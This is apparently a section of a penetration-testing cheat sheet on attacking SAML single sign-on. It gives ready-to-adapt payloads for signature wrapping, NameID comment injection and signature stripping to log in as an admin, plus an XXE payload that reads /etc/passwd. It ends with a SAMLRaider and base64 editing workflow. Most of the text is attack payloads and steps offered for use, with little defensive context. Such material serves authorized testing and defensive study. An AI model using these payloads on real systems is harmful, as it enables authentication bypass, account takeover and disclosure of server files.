## SAML ATTACKS

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- Original valid assertion: -->
<saml:Assertion ID="legit">
  <NameID><EMAIL-REDACTED></NameID>
  <ds:Signature>VALID_SIGNATURE_OVER_legit</ds:Signature>
</saml:Assertion>

<!-- XSW: Inject malicious assertion before/after the signed one. -->
<!-- Server validates signature on #legit but processes #evil instead. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID><EMAIL-REDACTED></NameID>     <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">              <!-- Original stays valid -->
    <NameID><EMAIL-REDACTED></NameID>
    <ds:Signature>VALID_SIGNATURE</ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Original: <EMAIL-REDACTED> -->
<!-- Injected:  -->
<NameID>admin<!---->@company.com</NameID>
<!-- XML parsers strip comments: <EMAIL-REDACTED> -->
<!-- SAML validator sees "<EMAIL-REDACTED>" (before comment) -->
<!-- Application uses "<EMAIL-REDACTED>" (after comment stripped) -->
```

### Attack 3: Signature Stripping
```
1. Capture SAMLResponse (base64 decode from browser)
2. Remove or modify the <Signature> element entirely
3. Change NameID to <EMAIL-REDACTED>
4. Re-encode and submit
5. If server doesn't validate signature presence = admin login
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Response>
  <saml:Assertion>
    <NameID>&xxe;</NameID>
  </saml:Assertion>
</saml:Response>
```

### Tools
```bash
# SAMLRaider (Burp extension) — most automated XSW testing
# Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider

# Manual: decode, modify, re-encode
echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --format - > saml.xml
# Edit saml.xml
cat saml.xml | base64 -w0  # Re-encode
```

---

